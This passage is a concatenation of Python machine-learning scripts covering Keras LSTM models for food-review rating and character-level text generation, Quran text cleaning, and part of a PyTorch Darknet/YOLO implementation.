    model.add(LSTM(LSTM_units, recurrent_dropout=0.2))
    model.add(Dropout(0.3))
    model.add(Dense(1, activation='sigmoid'))
    model.summary()
    return model

def get_model_5stars(vocab_size, sequence_length, embedding_size, verbose=0):
    model=Sequential()
    model.add(Embedding(vocab_size, embedding_size, input_length=sequence_length))
    model.add(SpatialDropout1D(0.15))
    model.add(LSTM(LSTM_units, recurrent_dropout=0.2))
    model.add(Dropout(0.3))
    model.add(Dense(1, activation="linear"))
    if verbose:
        model.summary()
    return model




import numpy as np
import pandas as pd
import tqdm
import pickle
from collections import Counter
from sklearn.model_selection import train_test_split

from utils import clean_text, tokenize_words
from config import N, test_size

def load_review_data():
    # df = pd.read_csv("data/Reviews.csv")
    df = pd.read_csv(r"E:\datasets\sentiment\food_reviews\amazon-fine-food-reviews\Reviews.csv")
    # preview
    print(df.head())
    print(df.tail())
    vocab = []
    # X = np.zeros((len(df)*2, 2), dtype=object)
    X = np.zeros((len(df), 2), dtype=object)
    # for i in tqdm.tqdm(range(len(df)), "Cleaning X1"):
    #     target = df['Text'].loc[i]
    #     score = df['Score'].loc[i]
    #     X[i, 0] = clean_text(target)
    #     X[i, 1] = score
    #     for word in X[i, 0].split():
    #         vocab.append(word)

    # k = i+1
    k = 0

    for i in tqdm.tqdm(range(len(df)), "Cleaning X2"):
        target = df['Summary'].loc[i]
        score = df['Score'].loc[i]
        X[i+k, 0] = clean_text(target)
        X[i+k, 1] = score
        for word in X[i+k, 0].split():
            vocab.append(word)

    # vocab = set(vocab)
    vocab = Counter(vocab)

    # delete words that occur less than 10 times
    vocab = { k:v for k, v in vocab.items() if v >= N }

    # word to integer encoder dict
    vocab2int = {word: i for i, word in enumerate(vocab, start=1)}

    # pickle int2vocab for testing 
    print("Pickling vocab2int...")
    pickle.dump(vocab2int, open("data/vocab2int.pickle", "wb"))

    # encoded reviews
    for i in tqdm.tqdm(range(X.shape[0]), "Tokenizing words"):
        X[i, 0] = tokenize_words(str(X[i, 0]), vocab2int)

    lengths = [ len(row)  for row in X[:, 0] ]
    print("min_length:", min(lengths))
    print("max_length:", max(lengths))

    X_train, X_test, y_train, y_test = train_test_split(X[:, 0], X[:, 1], test_size=test_size, shuffle=True, random_state=19)

    return X_train, X_test, y_train, y_test, vocab




import os
# disable keras loggings
import sys
stderr = sys.stderr
sys.stderr = open(os.devnull, 'w')
import keras
sys.stderr = stderr
# to use CPU
os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'
import tensorflow as tf

config = tf.ConfigProto(intra_op_parallelism_threads=5,

                        inter_op_parallelism_threads=5, 

                        allow_soft_placement=True,

                        device_count = {'CPU' : 1,

                                        'GPU' : 0}

                       )

from model import get_model_5stars
from utils import clean_text, tokenize_words
from config import embedding_size, sequence_length
from keras.preprocessing.sequence import pad_sequences

import pickle

vocab2int = pickle.load(open("data/vocab2int.pickle", "rb"))
model = get_model_5stars(len(vocab2int), sequence_length=sequence_length, embedding_size=embedding_size)

model.load_weights("results/model_V20_0.38_0.80.h5")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Food Review evaluator")
    parser.add_argument("review", type=str, help="The review of the product in text")
    args = parser.parse_args()

    review = tokenize_words(clean_text(args.review), vocab2int)
    x = pad_sequences([review], maxlen=sequence_length)

    print(f"{model.predict(x)[0][0]:.2f}/5")




# to use CPU
# import os
# os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
# os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

# import tensorflow as tf

# config = tf.ConfigProto(intra_op_parallelism_threads=5,
#                         inter_op_parallelism_threads=5, 
#                         allow_soft_placement=True,
#                         device_count = {'CPU' : 1,
#                                         'GPU' : 0}
                    #    )

import os
import numpy as np
import pandas as pd
from keras.callbacks import ModelCheckpoint
from keras.preprocessing import sequence

from preprocess import load_review_data
from model import get_model_5stars
from config import sequence_length, embedding_size, batch_size, epochs

X_train, X_test, y_train, y_test, vocab = load_review_data()

vocab_size = len(vocab)

print("Vocab size:", vocab_size)

X_train = sequence.pad_sequences(X_train, maxlen=sequence_length)
X_test = sequence.pad_sequences(X_test, maxlen=sequence_length)

print("X_train.shape:", X_train.shape)
print("X_test.shape:", X_test.shape)

print("y_train.shape:", y_train.shape)
print("y_test.shape:", y_test.shape)

model = get_model_5stars(vocab_size, sequence_length=sequence_length, embedding_size=embedding_size)
model.load_weights("results/model_V40_0.60_0.67.h5")
model.compile(loss="mse", optimizer="adam", metrics=["accuracy"])

if not os.path.isdir("results"):
    os.mkdir("results")

checkpointer = ModelCheckpoint("results/model_V40_{val_loss:.2f}_{val_acc:.2f}.h5", save_best_only=True, verbose=1)

model.fit(X_train, y_train, epochs=epochs,
          validation_data=(X_test, y_test),
          batch_size=batch_size,
          callbacks=[checkpointer])




import numpy as np
from string import punctuation

# make it a set to accelerate tests
punc = set(punctuation)

def clean_text(text):
    return ''.join([ c.lower() for c in str(text) if c not in punc ])

def tokenize_words(words, vocab2int):
    words = words.split()
    tokenized_words = np.zeros((len(words),))
    for j in range(len(words)):
        try:
            tokenized_words[j] = vocab2int[words[j]]
        except KeyError:
            # didn't add any unk, just ignore
            pass
    return tokenized_words




import numpy as np
import pickle
import tqdm
from keras.models import Sequential
from keras.layers import Dense, LSTM, Dropout, Activation
from keras.callbacks import ModelCheckpoint

seed = "import os"
# output:
# ded of and alice as it go on and the court
# well you wont you wouldncopy thing
# there was not a long to growing anxiously any only a low every cant
# go on a litter which was proves of any only here and the things and the mort meding and the mort and alice was the things said to herself i cant remeran as if i can repeat eften to alice any of great offf its archive of and alice and a cancur as the mo

char2int = pickle.load(open("python-char2int.pickle", "rb"))
int2char = pickle.load(open("python-int2char.pickle", "rb"))

sequence_length = 100
n_unique_chars = len(char2int)

# building the model
model = Sequential([
    LSTM(256, input_shape=(sequence_length, n_unique_chars), return_sequences=True),
    Dropout(0.3),
    LSTM(256),
    Dense(n_unique_chars, activation="softmax"),
])

model.load_weights("results/python-v2-2.48.h5")

# generate 400 characters
generated = ""
for i in tqdm.tqdm(range(400), "Generating text"):
    # make the input sequence
    X = np.zeros((1, sequence_length, n_unique_chars))
    for t, char in enumerate(seed):
        X[0, (sequence_length - len(seed)) + t, char2int[char]] = 1
    # predict the next character
    predicted = model.predict(X, verbose=0)[0]
    # converting the vector to an integer
    next_index = np.argmax(predicted)
    # converting the integer to a character
    next_char = int2char[next_index]
    # add the character to results
    generated += next_char
    # shift seed and the predicted character
    seed = seed[1:] + next_char

print("Generated text:")
print(generated)




import numpy as np
import os
import pickle
from keras.models import Sequential
from keras.layers import Dense, LSTM, Dropout
from keras.callbacks import ModelCheckpoint

from utils import get_batches

# import requests
# content = requests.get("http://www.gutenberg.org/cache/epub/11/pg11.txt").text
# open("data/wonderland.txt", "w", encoding="utf-8").write(content)

from string import punctuation
# read the data
# text = open("data/wonderland.txt", encoding="utf-8").read()
text = open("E:\\datasets\\text\\my_python_code.py").read()
# remove caps
text = text.lower()
for c in "!":
    text = text.replace(c, "")
# text = text.lower().replace("\n\n", "\n").replace("", "").replace("", "").replace("", "").replace("", "")
# text = text.translate(str.maketrans("", "", punctuation))
# text = text[:100_000]
n_chars = len(text)
unique_chars = ''.join(sorted(set(text)))
print("unique_chars:", unique_chars)
n_unique_chars = len(unique_chars)
print("Number of characters:", n_chars)
print("Number of unique characters:", n_unique_chars)

# dictionary that converts characters to integers
char2int = {c: i for i, c in enumerate(unique_chars)}
# dictionary that converts integers to characters
int2char = {i: c for i, c in enumerate(unique_chars)}

# save these dictionaries for later generation
pickle.dump(char2int, open("python-char2int.pickle", "wb"))
pickle.dump(int2char, open("python-int2char.pickle", "wb"))

# hyper parameters
sequence_length = 100
step = 1
batch_size = 128
epochs = 1

sentences = []
y_train = []
for i in range(0, len(text) - sequence_length, step):
    sentences.append(text[i: i + sequence_length])
    y_train.append(text[i+sequence_length])
print("Number of sentences:", len(sentences))

X = get_batches(sentences, y_train, char2int, batch_size, sequence_length, n_unique_chars, n_steps=step)

# for i, x in enumerate(X):
#     if i == 1:
#         break
#     print(x[0].shape, x[1].shape)

# # vectorization
# X = np.zeros((len(sentences), sequence_length, n_unique_chars))
# y = np.zeros((len(sentences), n_unique_chars))

# for i, sentence in enumerate(sentences):
#     for t, char in enumerate(sentence):
#         X[i, t, char2int[char]] = 1
#         y[i, char2int[y_train[i]]] = 1
# X = np.array([char2int[c] for c in text])

# print("X.shape:", X.shape)
# goal of X is (n_samples, sequence_length, n_chars)
# sentences = np.zeros(())


# print("y.shape:", y.shape)
# building the model
# model = Sequential([
#     LSTM(128, input_shape=(sequence_length, n_unique_chars)),
#     Dense(n_unique_chars, activation="softmax"),
# ])
# building the model
model = Sequential([
    LSTM(256, input_shape=(sequence_length, n_unique_chars), return_sequences=True),
    Dropout(0.3),
    LSTM(256),
    Dense(n_unique_chars, activation="softmax"),
])

model.load_weights("results/python-v2-2.48.h5")

model.summary()
model.compile(loss="categorical_crossentropy", optimizer="adam", metrics=["accuracy"])

if not os.path.isdir("results"):
    os.mkdir("results")

checkpoint = ModelCheckpoint("results/python-v2-{loss:.2f}.h5", verbose=1)

# model.fit(X, y, batch_size=batch_size, epochs=epochs, callbacks=[checkpoint])
model.fit_generator(X, steps_per_epoch=len(sentences) // batch_size, epochs=epochs, callbacks=[checkpoint])




import numpy as np

def get_batches(sentences, y_train, char2int, batch_size, sequence_length, n_unique_chars, n_steps):

    chars_per_batch = batch_size * n_steps
    n_batches = len(sentences) // chars_per_batch
    while True:
        for i in range(0, len(sentences), batch_size):

            X = np.zeros((batch_size, sequence_length, n_unique_chars))
            y = np.zeros((batch_size, n_unique_chars))

            for i, sentence in enumerate(sentences[i: i+batch_size]):
                for t, char in enumerate(sentence):
                    X[i, t, char2int[char]] = 1
                    y[i, char2int[y_train[i]]] = 1

            yield X, y




from pyarabic.araby import ALPHABETIC_ORDER

with open("quran.txt", encoding="utf8") as f:
    text = f.read()

unique_chars = set(text)
print("unique chars:", unique_chars)
arabic_alpha = { c for c, order in ALPHABETIC_ORDER.items() }
to_be_removed = unique_chars - arabic_alpha
to_be_removed = to_be_removed - {'.', ' ', ''}
print(to_be_removed)
text = text.replace("", ".")
for char in to_be_removed:
    text = text.replace(char, "")
text = text.replace("  ", " ")
text = text.replace(" \n", "")
text = text.replace("\n ", "")
with open("quran_cleaned.txt", "w", encoding="utf8") as f:
    print(text, file=f)




from sklearn.model_selection import GridSearchCV
from keras.wrappers.scikit_learn import KerasClassifier
from utils import read_data, text_to_sequence, get_batches, get_data
from models import rnn_model
from keras.layers import LSTM

import numpy as np

text, int2char, char2int = read_data()

batch_size = 256
test_size = 0.2

n_steps = 200
n_chars = len(text)
vocab_size = len(set(text))
print("n_steps:", n_steps)
print("n_chars:", n_chars)
print("vocab_size:", vocab_size)
encoded = np.array(text_to_sequence(text))
n_train = int(n_chars * (1-test_size))
X_train = encoded[:n_train]
X_test = encoded[n_train:]

X, Y = get_data(X_train, batch_size, n_steps, vocab_size=vocab_size+1)

print(X.shape)
print(Y.shape)

# cell, num_layers, units, dropout, output_dim, batch_normalization=True, bidirectional=True
model = KerasClassifier(build_fn=rnn_model, input_dim=n_steps, cell=LSTM, num_layers=2, dropout=0.2, output_dim=vocab_size+1,
                        batch_normalization=True, bidirectional=True)



params = {
    "units": [100, 128, 200, 256, 300]
}

grid = GridSearchCV(estimator=model, param_grid=params)
grid_result = grid.fit(X, Y)
print(grid_result.best_estimator_)
print(grid_result.best_params_)
print(grid_result.best_score_)




from keras.models import Sequential
from keras.layers import LSTM, Dropout, BatchNormalization, LeakyReLU, Dense, Activation, TimeDistributed, Bidirectional

def rnn_model(input_dim, cell, num_layers, units, dropout, output_dim, batch_normalization=True, bidirectional=True):
    model = Sequential()
    for i in range(num_layers):
        if i == 0:
            # first time, specify input_shape
            # if bidirectional:
            #     model.add(Bidirectional(cell(units, input_shape=(None, input_dim), return_sequences=True)))
            # else:
            model.add(cell(units, input_shape=(None, input_dim), return_sequences=True))
            if batch_normalization:
                model.add(BatchNormalization())
            model.add(Dropout(dropout))
            model.add(LeakyReLU(alpha=0.1))
        else:
            if i == num_layers - 1:
                return_sequences = False
            else:
                return_sequences = True
            if bidirectional:
                model.add(Bidirectional(cell(units, return_sequences=return_sequences)))
            else:
                model.add(cell(units, return_sequences=return_sequences))
            if batch_normalization:
                model.add(BatchNormalization())
            model.add(Dropout(dropout))
            model.add(LeakyReLU(alpha=0.1))

    model.add(Dense(output_dim, activation="softmax"))

    model.compile(loss="categorical_crossentropy", optimizer="nadam", metrics=["accuracy"])
    return model




# to use CPU
import os
os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import tensorflow as tf

config = tf.ConfigProto(intra_op_parallelism_threads=5,
                        inter_op_parallelism_threads=5, 
                        allow_soft_placement=True,
                        device_count = {'CPU' : 1,
                                        'GPU' : 0}
                       )
from models import rnn_model
from keras.layers import LSTM
from utils import sequence_to_text, get_data

import numpy as np
import pickle

char2int = pickle.load(open("results/char2int.pickle", "rb"))
int2char = { v:k for k, v in char2int.items() }
print(int2char)
n_steps = 500

def text_to_sequence(text):
    global char2int
    return [ char2int[c] for c in text ]

def pick_top_n(preds, vocab_size, top_n=5):
    p = np.squeeze(preds)
    p[np.argsort(p)[:-top_n]] = 0
    p = p / np.sum(p)
    c = np.random.choice(vocab_size, 1, p=p)[0]
    return c

def logits_to_text(logits):
    """
    Turn logits from a neural network into text using the tokenizer
    :param logits: Logits from a neural network
    :param tokenizer: Keras Tokenizer fit on the labels
    :return: String that represents the text of the logits
    """
    return int2char[np.argmax(logits, axis=0)]
    # return ''.join([int2char[prediction] for prediction in np.argmax(logits, 1)])

def generate_code(model, initial_text, n_chars=100):
    new_chars = ""
    for i in range(n_chars):
        x = np.array(text_to_sequence(initial_text))
        x, _ = get_data(x, 64, n_steps, 1)
        pred = model.predict(x)[0][0]
        c = logits_to_text(pred)
        new_chars += c
        initial_text += c
    return new_chars


model = rnn_model(input_dim=n_steps, output_dim=99, cell=LSTM, num_layers=3, units=200, dropout=0.2, batch_normalization=True)

model.load_weights("results/rnn_3.5")
x = """x = np.array(text_to_sequence(x))
x, _ = get_data(x, n_steps, 1)
print(x.shape)
print(x.shape)
print(model.predict_proba(x))
print(model.predict_classes(x))

def pick_top_n(preds, vocab_size, top_n=5):
    p = np.squeeze(preds)
    p[np.argsort(p)[:-top_n]] = 0
    p = p / np.sum(p)
    c = np.random.choice(vocab_size, 1, p=p)[0]
    return c
    
def sample(checkpoint, n_samples, lstm_size, vocab_size, prime="The"):
    samples = [c for c in prime]
    
    with train_chars.tf.Session() as sess:
        saver.restore(sess, checkpoint)
        new_state = sess.run(model.initial_state)
        for c in prime:
            x = np.zeros((1, 1))
            x[0,0] = train_chars.char2int[c]
            feed = {model.inputs: x,
                    model.keep_prob: 1.,
                    model.initial_state: new_state}
            preds, new_state = sess.run([model.prediction, model.final_state], 
                                         feed_dict=feed)
        # print("Preds:", preds)
        c = pick_top_n(preds, len(train_chars.vocab))
        samples.append(train_chars.int2char[c])

        for i in range(n_samples):
            x[0,0] = c
            feed = {model.inputs: x,
                    model.keep_prob: 1.,
                    model.initial_state: new_state}
            preds, new_state = sess.run([model.prediction, model.final_state], 
                                         feed_dict=feed)

            c = pick_top_n(preds, len(train_chars.vocab))
            char = train_chars.int2char[c]
            samples.append(char)
        #     if i == n_samples - 1 and char != " " and char != ".":
            if i == n_samples - 1 and char != " ":
                # while char != "." and char != " ":
                while char != " ":
                    x[0,0] = c
                    feed = {model.inputs: x,
                            model.keep_prob: 1.,
                            model.initial_state: new_state}
                    preds, new_state = sess.run([model.prediction, model.final_state], 
                                                feed_dict=feed)

                    c = pick_top_n(preds, len(train_chars.vocab))
                    char = train_chars.int2char[c]
                    samples.append(cha
"""

# print(x.shape)
# print(x.shape)
# pred = model.predict(x)[0][0]
# print(pred)
# print(logits_to_text(pred))
# print(model.predict_classes(x))
print(generate_code(model, x, n_chars=500))




from models import rnn_model
from keras.layers import LSTM
from keras.callbacks import ModelCheckpoint
from utils import text_to_sequence, sequence_to_text, get_batches, read_data, get_data, get_data_length

import numpy as np
import os

text, int2char, char2int = read_data(load=False)

batch_size = 256
test_size = 0.2

n_steps = 500
n_chars = len(text)
vocab_size = len(set(text))
print("n_steps:", n_steps)
print("n_chars:", n_chars)
print("vocab_size:", vocab_size)
encoded = np.array(text_to_sequence(text))
n_train = int(n_chars * (1-test_size))
X_train = encoded[:n_train]
X_test = encoded[n_train:]

train = get_batches(X_train, batch_size, n_steps, output_format="many", vocab_size=vocab_size+1)
test = get_batches(X_test, batch_size, n_steps, output_format="many", vocab_size=vocab_size+1)

for i, t in enumerate(train):
    if i == 2:
        break
print(t[0])
print(np.array(t[0]).shape)
# print(test.shape)

# # DIM = 28

# model = rnn_model(input_dim=n_steps, output_dim=vocab_size+1, cell=LSTM, num_layers=3, units=200, dropout=0.2, batch_normalization=True)
# model.summary()

# model.compile(loss="categorical_crossentropy", optimizer="nadam", metrics=["accuracy"])

# if not os.path.isdir("results"):
#     os.mkdir("results")

# checkpointer = ModelCheckpoint("results/rnn_{val_loss:.1f}", save_best_only=True, verbose=1)

# train_steps_per_epoch = get_data_length(X_train, n_steps, output_format="one") // batch_size
# test_steps_per_epoch = get_data_length(X_test, n_steps, output_format="one") // batch_size

# print("train_steps_per_epoch:", train_steps_per_epoch)
# print("test_steps_per_epoch:", test_steps_per_epoch)

# model.load_weights("results/rnn_3.2")

# model.fit_generator(train,
#           epochs=30,
#           validation_data=(test),
#           steps_per_epoch=train_steps_per_epoch,
#           validation_steps=test_steps_per_epoch,
#           callbacks=[checkpointer],
#           verbose=1)

# model.save("results/rnn_final.model")




import numpy as np
import tqdm
import pickle
from keras.utils import to_categorical

int2char, char2int = None, None

def read_data(load=False):
    global int2char
    global char2int

    with open("E:\\datasets\\text\\my_python_code.py") as f:
        text = f.read()

    unique_chars = set(text)
    if not load:
        int2char = { i: c for i, c in enumerate(unique_chars, start=1) }
        char2int = { c: i for i, c in enumerate(unique_chars, start=1) }
        pickle.dump(int2char, open("results/int2char.pickle", "wb"))
        pickle.dump(char2int, open("results/char2int.pickle", "wb"))
    else:
        int2char = pickle.load(open("results/int2char.pickle", "rb"))
        char2int = pickle.load(open("results/char2int.pickle", "rb"))
    return text, int2char, char2int


def get_batches(arr, batch_size, n_steps, vocab_size, output_format="many"):
    '''Create a generator that returns batches of size
       batch_size x n_steps from arr.
       
       Arguments
       ---------
       arr: Array you want to make batches from
       batch_size: Batch size, the number of sequences per batch
       n_steps: Number of sequence steps per batch
    '''
    chars_per_batch = batch_size * n_steps
    n_batches = len(arr) // chars_per_batch

    arr = arr[:chars_per_batch * n_batches]

    arr = arr.reshape((batch_size, -1))
    if output_format == "many":
        while True:
            for n in range(0, arr.shape[1], n_steps):
                x = arr[:, n: n+n_steps]
                y_temp = arr[:, n+1:n+n_steps+1]
                y = np.zeros(x.shape, dtype=y_temp.dtype)
                y[:, :y_temp.shape[1]] = y_temp
                yield x.reshape(1, x.shape[0], x.shape[1]), y.reshape(1, y.shape[0], y.shape[1])
    elif output_format == "one":
        while True:
            # X = np.zeros((arr.shape[1], n_steps))
            # y = np.zeros((arr.shape[1], 1))
            # for i in range(n_samples-n_steps):
            #     X[i] = np.array([ p.replace(",", "") if isinstance(p, str) else p for p in df.Price.iloc[i: i+n_steps] ])
            #     price = df.Price.iloc[i + n_steps]
            #     y[i] = price.replace(",", "") if isinstance(price, str) else price
            for n in range(arr.shape[1] - n_steps-1):
                x = arr[:, n: n+n_steps]
                y = arr[:, n+n_steps+1]
                # print("y.shape:", y.shape)
                y = to_categorical(y, num_classes=vocab_size)
                # print("y.shape after categorical:", y.shape)
                y = np.expand_dims(y, axis=0)
                yield x.reshape(1, x.shape[0], x.shape[1]), y


def get_data(arr, batch_size, n_steps, vocab_size):

    # n_samples = len(arr) // n_seq
    # X = np.zeros((n_seq, n_samples))
    # Y = np.zeros((n_seq, n_samples))
    chars_per_batch = batch_size * n_steps
    n_batches = len(arr) // chars_per_batch

    arr = arr[:chars_per_batch * n_batches]

    arr = arr.reshape((batch_size, -1))

    # for index, i in enumerate(range(0, n_samples*n_seq, n_seq)):
    #     x = arr[i:i+n_seq]
    #     y = arr[i+1:i+n_seq+1]
    #     if len(x) != n_seq or len(y) != n_seq:
    #         break
    #     X[:, index] = x
    #     Y[:, index] = y
    X = np.zeros((batch_size, arr.shape[1]))
    Y = np.zeros((batch_size, vocab_size))
    for n in range(arr.shape[1] - n_steps-1):
        x = arr[:, n: n+n_steps]
        y = arr[:, n+n_steps+1]
        # print("y.shape:", y.shape)
        y = to_categorical(y, num_classes=vocab_size)
        # print("y.shape after categorical:", y.shape)
        # y = np.expand_dims(y, axis=1)
        X[:, n: n+n_steps] = x
        Y[n] = y
        # yield x.reshape(1, x.shape[0], x.shape[1]), y
    return np.expand_dims(X, axis=1), Y
        
    # return n_samples
    # return X.T.reshape(1, X.shape[1], X.shape[0]), Y.T.reshape(1, Y.shape[1], Y.shape[0])

def get_data_length(arr, n_seq, output_format="many"):
    if output_format == "many":
        return len(arr) // n_seq
    elif output_format == "one":
        return len(arr) - n_seq


def text_to_sequence(text):
    global char2int
    return [ char2int[c] for c in text ]

def sequence_to_text(sequence):
    global int2char
    return ''.join([ int2char[i] for i in sequence ])




import json
import os
import glob

CUR_DIR = os.getcwd()
text = ""

# for filename in os.listdir(os.path.join(CUR_DIR, "data", "json")):
surat = [ f"surah_{i}.json" for i in range(1, 115) ]
for filename in surat:
    filename = os.path.join(CUR_DIR, "data", "json", filename)
    file = json.load(open(filename, encoding="utf8"))
    content = file['verse']
    for verse_id, ayah in content.items():
        text += f"{ayah}."
            
n_ayah = len(text.split("."))
n_words = len(text.split(" "))
n_chars = len(text)

print(f"Number of ayat: {n_ayah}, Number of words: {n_words}, Number of chars: {n_chars}")

with open("quran.txt", "w", encoding="utf8") as quran_file:
    print(text, file=quran_file)




import torch
import torch.nn as nn
import numpy as np

# let us run this cell only if CUDA is available
# We will use torch.device objects to move tensors in and out of GPU
if torch.cuda.is_available():
    x = torch.randn(1)
    device = torch.device("cuda")          # a CUDA device object
    y = torch.ones_like(x, device=device)  # directly create a tensor on GPU
    x = x.to(device)                       # or just use strings .to("cuda")
    z = x + y
    print(z)
    print(z.to("cpu", torch.double))       # .to can also change dtype together!


class YoloLayer(nn.Module):
    def __init__(self, anchor_mask=[], num_classes=0, anchors=[], num_anchors=1):
        super(YoloLayer, self).__init__()
        self.anchor_mask = anchor_mask
        self.num_classes = num_classes
        self.anchors = anchors
        self.num_anchors = num_anchors
        self.anchor_step = len(anchors)/num_anchors
        self.coord_scale = 1
        self.noobject_scale = 1
        self.object_scale = 5
        self.class_scale = 1
        self.thresh = 0.6
        self.stride = 32
        self.seen = 0

    def forward(self, output, nms_thresh):
        self.thresh = nms_thresh
        masked_anchors = []
            
        for m in self.anchor_mask:
            masked_anchors += self.anchors[m*self.anchor_step:(m+1)*self.anchor_step]
                
        masked_anchors = [anchor/self.stride for anchor in masked_anchors]
        boxes = get_region_boxes(output.data, self.thresh, self.num_classes, masked_anchors, len(self.anchor_mask))
            
        return boxes

    
class Upsample(nn.Module):
    def __init__(self, stride=2):
        super(Upsample, self).__init__()
        self.stride = stride
    def forward(self, x):
        stride = self.stride
        assert(x.data.dim() == 4)
        B = x.data.size(0)
        C = x.data.size(1)
        H = x.data.size(2)
        W = x.data.size(3)
        ws = stride
        hs = stride
        x = x.view(B, C, H, 1, W, 1).expand(B, C, H, stride, W, stride).contiguous().view(B, C, H*stride, W*stride)
        return x


#for route and shortcut
class EmptyModule(nn.Module):
    def __init__(self):
        super(EmptyModule, self).__init__()

    def forward(self, x):
        return x

# support route shortcut
class Darknet(nn.Module):
    def __init__(self, cfgfile):
        super(Darknet, self).__init__()
        self.blocks = parse_cfg(cfgfile)
        self.models = self.create_network(self.blocks) # merge conv, bn,leaky
        self.loss = self.models[len(self.models)-1]

        self.width = int(self.blocks[0]['width'])
        self.height = int(self.blocks[0]['height'])

        self.header = torch.IntTensor([0,0,0,0])
        self.seen = 0

    def forward(self, x, nms_thresh):            
        ind = -2
        self.loss = None
        outputs = dict()
        out_boxes = []
        
        for block in self.blocks:
            ind = ind + 1
            if block['type'] == 'net':
                continue
            elif block['type'] in ['convolutional', 'upsample']: 
                x = self.models[ind](x)
                outputs[ind] = x
            elif block['type'] == 'route':
                layers = block['layers'].split(',')
                layers = [int(i) if int(i) > 0 else int(i)+ind for i in layers]
                if len(layers) == 1:
                    x = outputs[layers[0]]
                    outputs[ind] = x
                elif len(layers) == 2:
                    x1 = outputs[layers[0]]
                    x2 = outputs[layers[1]]
                    x = torch.cat((x1,x2),1)
                    outputs[ind] = x
            elif block['type'] == 'shortcut':
                from_layer = int(block['from'])
                activation = block['activation']
                from_layer = from_layer if from_layer > 0 else from_layer + ind
                x1 = outputs[from_layer]
                x2 = outputs[ind-1]
                x  = x1 + x2
                outputs[ind] = x
            elif block['type'] == 'yolo':
                boxes = self.models[ind](x, nms_thresh)
                out_boxes.append(boxes)
            else:
                print('unknown type %s' % (block['type']))
            
        return out_boxes
    

    def print_network(self):
        print_cfg(self.blocks)

    def create_network(self, blocks):
        models = nn.ModuleList()
    
        prev_filters = 3
        out_filters =[]
        prev_stride = 1
        out_strides = []
        conv_id = 0
        for block in blocks:
            if block['type'] == 'net':
                prev_filters = int(block['channels'])
                continue
            elif block['type'] == 'convolutional':
                conv_id = conv_id + 1
                batch_normalize = int(block['batch_normalize'])
                filters = int(block['filters'])
                kernel_size = int(block['size'])
                stride = int(block['stride'])
                is_pad = int(block['pad'])
                pad = (kernel_size-1)//2 if is_pad else 0
                activation = block['activation']
                model = nn.Sequential()
                if batch_normalize:
                    model.add_module('conv{0}'.format(conv_id), nn.Conv2d(prev_filters, filters, kernel_size, stride, pad, bias=False))
                    model.add_module('bn{0}'.format(conv_id), nn.BatchNorm2d(filters))
                else:
                    model.add_module('conv{0}'.format(conv_id), nn.Conv2d(prev_filters, filters, kernel_size, stride, pad))
                if activation == 'leaky':
                    model.add_module('leaky{0}'.format(conv_id), nn.LeakyReLU(0.1, inplace=True))
                prev_filters = filters
                out_filters.append(prev_filters)
                prev_stride = stride * prev_stride
                out_strides.append(prev_stride)
                models.append(model)
            elif block['type'] == 'upsample':
                stride = int(block['stride'])
                out_filters.append(prev_filters)
                prev_stride = prev_stride // stride
                out_strides.append(prev_stride)
                models.append(Upsample(stride))
            elif block['type'] == 'route':
                layers = block['layers'].split(',')
                ind = len(models)
                layers = [int(i) if int(i) > 0 else int(i)+ind for i in layers]
                if len(layers) == 1:
                    prev_filters = out_filters[layers[0]]
                    prev_stride = out_strides[layers[0]]
                elif len(layers) == 2:
                    assert(layers[0] == ind - 1)
                    prev_filters = out_filters[layers[0]] + out_filters[layers[1]]
                    prev_stride = out_strides[layers[0]]
                out_filters.append(prev_filters)
                out_strides.append(prev_stride)
                models.append(EmptyModule())
            elif block['type'] == 'shortcut':
                ind = len(models)
                prev_filters = out_filters[ind-1]
                out_filters.append(prev_filters)
                prev_stride = out_strides[ind-1]
                out_strides.append(prev_stride)
                models.append(EmptyModule())
            elif block['type'] == 'yolo':
                yolo_layer = YoloLayer()
                anchors = block['anchors'].split(',')
                anchor_mask = block['mask'].split(',')
                yolo_layer.anchor_mask = [int(i) for i in anchor_mask]
                yolo_layer.anchors = [float(i) for i in anchors]
                yolo_layer.num_classes = int(block['classes'])
                yolo_layer.num_anchors = int(block['num'])
                yolo_layer.anchor_step = len(yolo_layer.anchors)//yolo_layer.num_anchors
                yolo_layer.stride = prev_stride
                out_filters.append(prev_filters)
                out_strides.append(prev_stride)
                models.append(yolo_layer)
            else:
                print('unknown type %s' % (block['type']))
    
        return models

    def load_weights(self, weightfile):
        print()
        fp = open(weightfile, 'rb')
        header = np.fromfile(fp, count=5, dtype=np.int32)
        self.header = torch.from_numpy(header)
        self.seen = self.header[3]
        buf = np.fromfile(fp, dtype = np.float32)
        fp.close()

        start = 0
        ind = -2
        counter = 3
        for block in self.blocks:
            if start >= buf.size:
                break
            ind = ind + 1
            if block['type'] == 'net':
                continue
            elif block['type'] == 'convolutional':
                model = self.models[ind]
                batch_normalize = int(block['batch_normalize'])
                if batch_normalize:
                    start = load_conv_bn(buf, start, model[0], model[1])
                else:
                    start = load_conv(buf, start, model[0])
            elif block['type'] == 'upsample':
                pass
            elif block['type'] == 'route':
                pass
            elif block['type'] == 'shortcut':
                pass
            elif block['type'] == 'yolo':
                pass
            else:
                print('unknown type %s' % (block['type']))
            
            percent_comp = (counter / len(self.blocks)) * 100

            print('Loading weights. Please Wait...{:.2f}% Complete'.format(percent_comp), end = '\r', flush = True)

            counter += 1

            
            
def convert2cpu(gpu_matrix):
    return torch.FloatTensor(gpu_matrix.size()).copy_(gpu_matrix)


def convert2cpu_long(gpu_matrix):
    return torch.LongTensor(gpu_matrix.size()).copy_(gpu_matrix)


def get_region_boxes(output, conf_thresh, num_classes, anchors, num_anchors, only_objectness = 1, validation = False):
    anchor_step = len(anchors)//num_anchors
    if output.dim() == 3:
        output = output.unsqueeze(0)
    batch = output.size(0)
    assert(output.size(1) == (5+num_classes)*num_anchors)
    h = output.size(2)
    w = output.size(3)

    all_boxes = []
    output = output.view(batch*num_anchors, 5+num_classes, h*w).transpose(0,1).contiguous().view(5+num_classes, batch*num_anchors*h*w)

